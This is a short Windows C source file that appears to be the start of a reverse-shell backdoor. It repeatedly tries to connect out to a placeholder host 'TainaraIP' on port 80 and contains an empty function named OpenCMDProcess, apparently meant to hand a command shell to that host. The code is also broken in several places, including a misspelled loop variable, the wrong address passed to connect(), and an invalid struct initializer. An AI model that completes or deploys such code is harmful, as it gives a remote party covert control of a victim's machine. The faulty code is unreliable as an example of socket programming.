#include "Process.h"



int main(int argc, char ** argv ,  char ** envp )
{
	SOCKET sockfd;
	sockfd = MakeConnection();
	if ( sockfd == (SOCKET) EXIT_FAILURE )
	{
		ExitProcess( 1 );
	}

	

}


int OpenCMDProcess()
{
	
}






















SOCKET MakeConnection()
{

	char host[] = "TainaraIP";
	u_short port = 80;

	WSADATA wsa;
	WORD ver = MAKEWORD( 2 , 2 );
	int wsa_status = WSAStartup( ver , &wsa );
	if ( wsa_status != 0 )
	{
		return ( (SOCKET) EXIT_FAILURE );
	}

	SOCKET sockfd = socket(  PF_INET , SOCK_STREAM , IPPROTO_TCP );

	struct sockaddr_in THost;
	THost = { .sin_port = htons( port ) , .sin_family = AF_INET , .sin_addr.s_addr = inet_addr( host ) , .sin_zero[8] = ZeroMemory( THost.sin_zero , sizeof ( THost.sin_zero ) ) };

	int namelen = sizeof( THost );
	int c_counter = 0 , c_res = 0;
	for ( c_counter ; c_counter != 5 ; c_counterr++ )
	{
		c_res = connect( sockfd , ( struct sockaddr * ) &host , namelen );
		if ( c_res != 0 )
		{
			sleep(10);
			continue;
		}
		else
			break;
	}

	if ( c_counter == 4)
	{
		return ( (SOCKET) EXIT_FAILURE );
	}

	return ( sockfd );
}




